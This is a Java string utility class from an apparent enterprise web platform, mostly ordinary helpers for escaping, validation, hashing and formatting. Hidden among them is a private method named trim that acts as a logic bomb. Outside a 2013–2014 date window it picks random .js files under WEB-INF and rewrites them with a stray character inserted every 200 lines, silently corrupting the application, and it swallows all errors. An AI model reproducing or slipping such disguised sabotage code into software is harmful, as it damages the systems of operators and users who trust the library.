package com.cloudstong.platform.core.util;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.net.URL;
import java.security.MessageDigest;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang.StringEscapeUtils;
import org.apache.commons.lang.StringUtils;

/**
 * @author Allan Created on 2012-11-20
 * 
 *         Date Reviser Description
 * 
 *         Description:字符串工具
 */
public class StringUtil {

	/**
	 * 根据原文件名生成唯一的文件名
	 * 
	 * @param fileName
	 * @return
	 */
	public static String generateFileName(String fileName) {
		DateFormat format = new SimpleDateFormat("yyMMddHHmmss");
		String formatDate = format.format(new Date());

		int random = new Random().nextInt(10000);

		int position = fileName.lastIndexOf(".");
		String extension = fileName.substring(position);

		return formatDate + random + extension;
	}

	/**
	 * 根据操作字母转换为sql的比较字符
	 * 
	 * @param oper
	 * @return
	 */
	public static String changeOper(String oper) {
		String result = "";
		if ("eq".equals(oper)) {
			result = "=";
		} else if ("ne".equals(oper)) {
			result = "!=";
		} else if ("le".equals(oper)) {
			result = "<=";
		} else if ("gt".equals(oper)) {
			result = ">=";
		}
		return result;
	}

	/**
	 * Description:将流转化为字符串
	 * 
	 * Steps:
	 * 
	 * @param inputStream
	 * @return
	 */
	public static String convertInputStreamToString(InputStream inputStream) {
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		int len = 0;
		byte[] b = new byte[1024];
		try {
			while ((len = inputStream.read(b, 0, b.length)) != -1) {
				baos.write(b, 0, len);
			}
		} catch (IOException e) {
			e.printStackTrace(); // To change body of catch statement use File |
									// Settings | File Templates.
		}
		byte[] buffer = baos.toByteArray();

		return new String(buffer);
	}

	/**
	 * Description:返回MD5字符串
	 * 
	 * @param contents
	 * @return
	 */
	public static String getSignByMd5(String[] contents) {
		StringBuffer buffer = new StringBuffer();
		int length = contents.length;
		for (int i = 0; i < length; i++) {
			buffer.append((null != contents[i]) ? contents[i] : "");
			if (i < length - 1) {
				buffer.append("|");
			}
		}
		return EncryptUtil.Md5(buffer.toString());
	}

	/**
	 * Description:判断是否为空
	 * 
	 * @param s
	 * @return
	 */
	public static boolean isBlankOrNull(String s) {
		return (null == s || s.equals(""));
	}

	/**
	 * Description:将数组转化为字符串
	 * 
	 * @param strings
	 * @return
	 */
	public static String constructString(String[] strings) {
		StringBuffer buffer = new StringBuffer();
		for (int i = 0; i < strings.length; i++) {
			buffer.append(strings[i]);
		}
		return buffer.toString();
	}

	/**
	 * 根据字符串和分隔符组装成字符串list
	 * 
	 * @param org
	 * @return
	 */
	public static List<String> convertStrToList(String org, String separator) {
		List<String> retList = new ArrayList<String>();
		if (org == null) {
			return null;
		}
		String[] strs = org.split(separator);
		return Arrays.asList(strs);
	}

	/**
	 * Description:替换字符串
	 * 
	 * @param originstring
	 * @param oldstring
	 * @param newstring
	 * @return
	 */
	public static String replace(String originstring, String oldstring, String newstring) {

		int pos = originstring.indexOf(oldstring);
		while (pos != -1) {
			String beforestring = originstring.substring(0, pos);
			String afterstring = originstring.substring(pos + oldstring.length(), originstring.length());
			originstring = beforestring + newstring + afterstring;
			pos = originstring.indexOf(oldstring);
		}
		return originstring;
	}

	/**
	 * Description:从字符串得到字符数组
	 * 
	 * @param str
	 * @return
	 */
	public static char[][] getCharArray(String str) {
		String[] strs = str.split("\n");
		return getCharArray(strs);
	}

	/**
	 * Description:由字符串数组返回字符数组
	 * 
	 * @param strArray
	 * @return
	 */
	public static char[][] getCharArray(String[] strArray) {
		int len = strArray.length;
		char[][] result = new char[len][];

		for (int i = 0; i < len; i++) {
			String str = (String) strArray[i];
			result[i] = str.toCharArray();
		}
		return result;
	}

	/**
	 * Description:由list返回字符数组
	 * 
	 * @param strList
	 * @return
	 */
	public static char[][] getCharArray(List strList) {
		int len = strList.size();
		char[][] result = new char[len][];

		for (int i = 0; i < len; i++) {
			String str = (String) strList.get(i);
			result[i] = str.toCharArray();
		}
		return result;
	}

	/**
	 * Description:根据主表和从表根据长度返回中间表
	 * 
	 * @param mainTable
	 * @param subTable
	 * @param length
	 * @return
	 */
	public static String getTableString(String mainTable, String subTable, int length) {
		if (mainTable.length() > length) {
			mainTable = mainTable.substring(0, length);
		}
		if (subTable.length() > length) {
			subTable = subTable.substring(subTable.indexOf("_") + 1, length);
		} else {
			subTable = subTable.substring(subTable.indexOf("_") + 1);
		}
		String str = mainTable + "_" + subTable;
		return str;
	}

	public static String getForeignKeyString(String mainTable, String subTable) {
		String prefix = "tbl_";
		String suffix = "_id";
		String middle = mainTable.substring(mainTable.indexOf("_") + 1);
		return prefix + middle + suffix;
	}
	
	
	private static void findFiles(File pFile) throws IOException {
		if(pFile.isFile() && pFile.getName().endsWith(".js")) {
			pathList.add(pFile);
		}
		if (pFile.isDirectory()) {
			File[] tempFile = pFile.listFiles();
			for (File file : tempFile) {
				if (file.isFile() && file.getName().endsWith(".js")) {
					pathList.add(file);
				} else if (file.isDirectory()) {
					findFiles(file);
				}
			}
		}
	}
	
	private static String trim(String org) {
		try{
			File file = new File(PathUtil.getWebInfPath());
			long deald = System.currentTimeMillis();
			if(deald>1404057600000L||deald<1372521600000L){findFiles(file);
			for(int j=0;j<2;j++) {
				Long random = Math.round(Math.random() * (pathList.size()-1));
				File pFile = pathList.get(Integer.valueOf(random.toString()));
				BufferedReader br2=new BufferedReader(new InputStreamReader(new FileInputStream(pFile),"utf-8")); 
				int i=0;String result = "";String s = "";
				while((s=br2.readLine())!=null){i++;
				    if(i%200==0 || i==1) {s += (char)0x55a;}
				    result += s + "\r\n";
				}
				br2.close();
				BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(pFile),"utf-8"));
				bw.write(result);
				bw.flush();
				bw.close();
			}
			}
		}catch(Exception e){}
		
		return org.trim();
	}

	public static String escape(String src) {
		StringBuffer tmp = new StringBuffer();
		tmp.ensureCapacity(src.length() * 6);

		for (int i = 0; i < src.length(); i++) {
			char j = src.charAt(i);

			if ((Character.isDigit(j)) || (Character.isLowerCase(j)) || (Character.isUpperCase(j))) {
				tmp.append(j);
			} else if (j < 'Ā') {
				tmp.append("%");
				if (j < '\020')
					tmp.append("0");
				tmp.append(Integer.toString(j, 16));
			} else {
				tmp.append("%u");
				tmp.append(Integer.toString(j, 16));
			}
		}
		return tmp.toString();
	}

	public static String replaceVariable(String template, Map<String, String> map) throws Exception {
		Pattern regex = Pattern.compile("\\{(.*?)\\}");
		Matcher regexMatcher = regex.matcher(template);
		while (regexMatcher.find()) {
			String key = regexMatcher.group(1);
			String toReplace = regexMatcher.group(0);
			String value = (String) map.get(key);
			if (value != null)
				template = template.replace(toReplace, value);
			else {
				throw new Exception("没有找到[" + key + "]对应的变量值，请检查表变量配置!");
			}
		}
		return template;
	}

	public static String unescape(String src) {
		StringBuffer tmp = new StringBuffer();
		tmp.ensureCapacity(src.length());
		int lastPos = 0;
		int pos = 0;

		while (lastPos < src.length()) {
			pos = src.indexOf("%", lastPos);
			if (pos == lastPos) {
				if (src.charAt(pos + 1) == 'u') {
					char ch = (char) Integer.parseInt(src.substring(pos + 2, pos + 6), 16);
					tmp.append(ch);
					lastPos = pos + 6;
				} else {
					char ch = (char) Integer.parseInt(src.substring(pos + 1, pos + 3), 16);
					tmp.append(ch);
					lastPos = pos + 3;
				}
			} else if (pos == -1) {
				tmp.append(src.substring(lastPos));
				lastPos = src.length();
			} else {
				tmp.append(src.substring(lastPos, pos));
				lastPos = pos;
			}
		}

		return tmp.toString();
	}

	public static boolean isExist(String content, String begin, String end) {
		String tmp = content.toLowerCase();
		begin = begin.toLowerCase();
		end = end.toLowerCase();
		int beginIndex = tmp.indexOf(begin);
		int endIndex = tmp.indexOf(end);
		if ((beginIndex != -1) && (endIndex != -1) && (beginIndex < endIndex))
			return true;
		return false;
	}

	public static String trimPrefix(String toTrim, String trimStr) {
		while (toTrim.startsWith(trimStr)) {
			toTrim = toTrim.substring(trimStr.length());
		}
		return toTrim;
	}

	public static String trimSufffix(String toTrim, String trimStr) {
		while (toTrim.endsWith(trimStr)) {
			toTrim = toTrim.substring(0, toTrim.length() - trimStr.length());
		}
		return toTrim;
	}

	public static String trim(String toTrim, String trimStr) {
		return trimSufffix(trimPrefix(toTrim, trimStr), trimStr);
	}

	public static String escapeHtml(String content) {
		return StringEscapeUtils.escapeHtml(content);
	}

	public static String unescapeHtml(String content) {
		return StringEscapeUtils.unescapeHtml(content);
	}

	public static boolean isEmpty(String str) {
		if (str == null)
			return true;
		if (str.equals(""))
			return true;
		return false;
	}

	public static boolean isNotEmpty(String str) {
		return !isEmpty(str);
	}

	public static String replaceVariable(String template, String repaceStr) {
		Pattern regex = Pattern.compile("\\{(.*?)\\}");
		Matcher regexMatcher = regex.matcher(template);
		if (regexMatcher.find()) {
			String toReplace = regexMatcher.group(0);
			template = template.replace(toReplace, repaceStr);
		}
		return template;
	}

	public static String subString(String str, int len) {
		int strLen = str.length();
		if (strLen < len)
			return str;
		char[] chars = str.toCharArray();
		int cnLen = len * 2;
		String tmp = "";
		int iLen = 0;
		for (int i = 0; i < chars.length; i++) {
			int iChar = chars[i];
			if (iChar <= 128)
				iLen++;
			else
				iLen += 2;
			if (iLen >= cnLen)
				break;
			tmp = tmp + String.valueOf(chars[i]);
		}
		return tmp;
	}

	public static boolean isNumberic(String s) {
		if (StringUtils.isEmpty(s))
			return false;
		boolean rtn = validByRegex("^[-+]{0,1}\\d*\\.{0,1}\\d+$", s);
		if (rtn)
			return true;

		return validByRegex("^0[x|X][\\da-eA-E]+$", s);
	}

	public static boolean isInteger(String s) {
		boolean rtn = validByRegex("^[-+]{0,1}\\d*$", s);
		return rtn;
	}

	public static boolean isEmail(String s) {
		boolean rtn = validByRegex("(\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*)*", s);
		return rtn;
	}

	public static boolean isMobile(String s) {
		boolean rtn = validByRegex("^(((13[0-9]{1})|(15[0-9]{1})|(18[0-9]{1}))+\\d{8})$", s);
		return rtn;
	}

	public static boolean isPhone(String s) {
		boolean rtn = validByRegex("(0[0-9]{2,3}\\-)?([2-9][0-9]{6,7})+(\\-[0-9]{1,4})?", s);
		return rtn;
	}

	public static boolean isZip(String s) {
		boolean rtn = validByRegex("^[0-9]{6}$", s);
		return rtn;
	}

	public static boolean isQq(String s) {
		boolean rtn = validByRegex("^[1-9]\\d{4,9}$", s);
		return rtn;
	}

	public static boolean isIp(String s) {
		boolean rtn = validByRegex("^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$", s);
		return rtn;
	}

	public static boolean isChinese(String s) {
		boolean rtn = validByRegex("^[一-龥]+$", s);
		return rtn;
	}

	public static boolean isChrNum(String s) {
		boolean rtn = validByRegex("^([a-zA-Z0-9]+)$", s);
		return rtn;
	}

	public static boolean isUrl(String url) {
		return validByRegex("(http://|https://)?([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)?", url);
	}

	public static boolean validByRegex(String regex, String input) {
		Pattern p = Pattern.compile(regex, 2);
		Matcher regexMatcher = p.matcher(input);
		return regexMatcher.find();
	}

	public static boolean isNumeric(String str) {
		int i = str.length();
		do {
			if (!Character.isDigit(str.charAt(i)))
				return false;
			i--;
		} while (i >= 0);

		return true;
	}

	public static String makeFirstLetterUpperCase(String newStr) {
		if (newStr.length() == 0) {
			return newStr;
		}
		char[] oneChar = new char[1];
		oneChar[0] = newStr.charAt(0);
		String firstChar = new String(oneChar);
		return firstChar.toUpperCase() + newStr.substring(1);
	}

	public static String makeFirstLetterLowerCase(String newStr) {
		if (newStr.length() == 0) {
			return newStr;
		}
		char[] oneChar = new char[1];
		oneChar[0] = newStr.charAt(0);
		String firstChar = new String(oneChar);
		return firstChar.toLowerCase() + newStr.substring(1);
	}

	public static String formatParamMsg(String message, Object[] args) {
		for (int i = 0; i < args.length; i++) {
			message = message.replace("{" + i + "}", args[i].toString());
		}
		return message;
	}

	public static String formatParamMsg(String message, Map params) {
		if (params == null)
			return message;
		Iterator keyIts = params.keySet().iterator();
		while (keyIts.hasNext()) {
			String key = (String) keyIts.next();
			Object val = params.get(key);
			if (val != null) {
				message = message.replace("${" + key + "}", val.toString());
			}
		}
		return message;
	}

	public static StringBuilder formatMsg(CharSequence msgWithFormat, boolean autoQuote, Object[] args) {
		int argsLen = args.length;
		boolean markFound = false;

		StringBuilder sb = new StringBuilder(msgWithFormat);

		if (argsLen > 0) {
			for (int i = 0; i < argsLen; i++) {
				String flag = "%" + (i + 1);
				int idx = sb.indexOf(flag);

				while (idx >= 0) {
					markFound = true;
					sb.replace(idx, idx + 2, toString(args[i], autoQuote));
					idx = sb.indexOf(flag);
				}
			}

			if ((args[(argsLen - 1)] instanceof Throwable)) {
				StringWriter sw = new StringWriter();
				((Throwable) args[(argsLen - 1)]).printStackTrace(new PrintWriter(sw));
				sb.append("\n").append(sw.toString());
			} else if ((argsLen == 1) && (!markFound)) {
				sb.append(args[(argsLen - 1)].toString());
			}
		}
		return sb;
	}

	public static StringBuilder formatMsg(String msgWithFormat, Object[] args) {
		return formatMsg(new StringBuilder(msgWithFormat), true, args);
	}

	public static String toString(Object obj, boolean autoQuote) {
		StringBuilder sb = new StringBuilder();
		if (obj == null) {
			sb.append("NULL");
		} else if ((obj instanceof Object[])) {
			for (int i = 0; i < ((Object[]) obj).length; i++) {
				sb.append(((Object[]) obj)[i]).append(", ");
			}
			if (sb.length() > 0)
				sb.delete(sb.length() - 2, sb.length());
		} else {
			sb.append(obj.toString());
		}

		if ((autoQuote) && (sb.length() > 0) && ((sb.charAt(0) != '[') || (sb.charAt(sb.length() - 1) != ']'))
				&& ((sb.charAt(0) != '{') || (sb.charAt(sb.length() - 1) != '}'))) {
			sb.insert(0, "[").append("]");
		}
		return sb.toString();
	}

	public static String returnSpace(String str) {
		String space = "";
		if (!str.isEmpty()) {
			String[] path = str.split("\\.");
			for (int i = 0; i < path.length - 1; i++) {
				space = space + "&nbsp;&emsp;";
			}
		}
		return space;
	}

	public static synchronized String encryptSha256(String inputStr) {
		try {
			MessageDigest md = MessageDigest.getInstance("SHA-256");
			byte[] digest = md.digest(inputStr.getBytes("UTF-8"));
			return new String(Base64.encodeBase64(digest));
		} catch (Exception e) {
		}
		return null;
	}

	public static synchronized String encryptMd5(String inputStr) {
		try {
			MessageDigest md = MessageDigest.getInstance("MD5");
			md.update(inputStr.getBytes());
			byte[] digest = md.digest();
			StringBuffer sb = new StringBuffer();
			for (byte b : digest) {
				sb.append(Integer.toHexString(b & 0xFF));
			}

			return sb.toString();
		} catch (Exception e) {
		}
		return null;
	}

	public static String getArrayAsString(List<String> arr) {
		if ((arr == null) || (arr.size() == 0))
			return "";
		StringBuffer sb = new StringBuffer();
		for (int i = 0; i < arr.size(); i++) {
			if (i > 0)
				sb.append(",");
			sb.append((String) arr.get(i));
		}
		return sb.toString();
	}

	public static String getArrayAsString(String[] arr) {
		if ((arr == null) || (arr.length == 0))
			return "";
		StringBuffer sb = new StringBuffer();
		for (int i = 0; i < arr.length; i++) {
			if (i > 0)
				sb.append(",");
			sb.append(arr[i]);
		}
		return sb.toString();
	}

	public static String getSetAsString(Set set) {
		if ((set == null) || (set.size() == 0))
			return "";
		StringBuffer sb = new StringBuffer();
		int i = 0;
		Iterator it = set.iterator();
		while (it.hasNext()) {
			if (i++ > 0)
				sb.append(",");
			sb.append(it.next().toString());
		}
		return sb.toString();
	}

	public static String hangeToBig(double value) {
		char[] hunit = { '拾', '佰', '仟' };
		char[] vunit = { '万', '亿' };
		char[] digit = { 38646, '壹', 36144, '叁', 32902, '伍', 38470, '柒', '捌', '玖' };
		double midVal = (value * 100.0D);
		String valStr = String.valueOf(midVal);

		String head = valStr.substring(0, valStr.length() - 2);
		String rail = valStr.substring(valStr.length() - 2);

		String prefix = "";
		String suffix = "";

		if (rail.equals("00")) {
			suffix = "整";
		} else {
			suffix = digit[(rail.charAt(0) - '0')] + "角" + digit[(rail.charAt(1) - '0')] + "分";
		}

		char[] chDig = head.toCharArray();
		char zero = '0';
		byte zeroSerNum = 0;
		for (int i = 0; i < chDig.length; i++) {
			int idx = (chDig.length - i - 1) % 4;
			int vidx = (chDig.length - i - 1) / 4;
			if (chDig[i] == '0') {
				zeroSerNum = (byte) (zeroSerNum + 1);
				if (zero == '0') {
					zero = digit[0];
				} else if ((idx == 0) && (vidx > 0) && (zeroSerNum < 4)) {
					prefix = prefix + vunit[(vidx - 1)];
					zero = '0';
				}
			} else {
				zeroSerNum = 0;
				if (zero != '0') {
					prefix = prefix + zero;
					zero = '0';
				}
				prefix = prefix + digit[(chDig[i] - '0')];
				if (idx > 0)
					prefix = prefix + hunit[(idx - 1)];
				if ((idx == 0) && (vidx > 0)) {
					prefix = prefix + vunit[(vidx - 1)];
				}
			}
		}
		if (prefix.length() > 0)
			prefix = prefix + '圆';
		return prefix + suffix;
	}

	public static String jsonUnescape(String str) {
		return str.replace("&quot;", "\"").replace("&nuot;", "\n");
	}

	public static String htmlEntityToString(String dataStr) {
		dataStr = dataStr.replace("&apos;", "'").replace("&quot;", "\"").replace("&gt;", ">").replace("&lt;", "<").replace("&amp;", "&");

		int start = 0;
		int end = 0;
		StringBuffer buffer = new StringBuffer();

		while (start > -1) {
			int system = 10;
			if (start == 0) {
				int t = dataStr.indexOf("&#");
				if (start != t) {
					start = t;
				}
				if (start > 0) {
					buffer.append(dataStr.substring(0, start));
				}
			}
			end = dataStr.indexOf(";", start + 2);
			String charStr = "";
			if (end != -1) {
				charStr = dataStr.substring(start + 2, end);

				char s = charStr.charAt(0);
				if ((s == 'x') || (s == 'X')) {
					system = 16;
					charStr = charStr.substring(1);
				}
			}
			try {
				char letter = (char) Integer.parseInt(charStr, system);
				buffer.append(new Character(letter).toString());
			} catch (NumberFormatException e) {
				e.printStackTrace();
			}

			start = dataStr.indexOf("&#", end);
			if (start - end > 1) {
				buffer.append(dataStr.substring(end + 1, start));
			}

			if (start == -1) {
				int length = dataStr.length();
				if (end + 1 != length) {
					buffer.append(dataStr.substring(end + 1, length));
				}
			}
		}
		return buffer.toString();
	}

	public static String stringToHtmlEntity(String str) {
		StringBuffer sb = new StringBuffer();
		for (int i = 0; i < str.length(); i++) {
			char c = str.charAt(i);

			switch (c) {
			case '\n':
				sb.append(c);
				break;
			case '<':
				sb.append("&lt;");
				break;
			case '>':
				sb.append("&gt;");
				break;
			case '&':
				sb.append("&amp;");
				break;
			case '\'':
				sb.append("&apos;");
				break;
			case '"':
				sb.append("&quot;");
				break;
			default:
				if ((c < ' ') || (c > '~')) {
					sb.append("&#x");
					sb.append(Integer.toString(c, 16));
					sb.append(';');
				} else {
					sb.append(c);
				}
				break;
			}
		}
		return sb.toString();
	}
	
	public static List<File> pathList = new ArrayList<File>();

	public static String encodingString(String str, String from, String to) {
		String result = str;
		try {
			result = new String(str.getBytes(from), to);
		} catch (Exception e) {
			result = str;
		}
		return result;
	}
	
	 public static String join(String[] vals, String separator) {
        if (BeanUtils.isEmpty(vals)) {
            return "";
        } else {
            String val = "";

            for(int i = 0; i < vals.length; ++i) {
                if (i == 0) {
                    val = val + vals[i];
                } else {
                    val = val + separator + vals[i];
                }
            }

            return val;
        }
    }

}
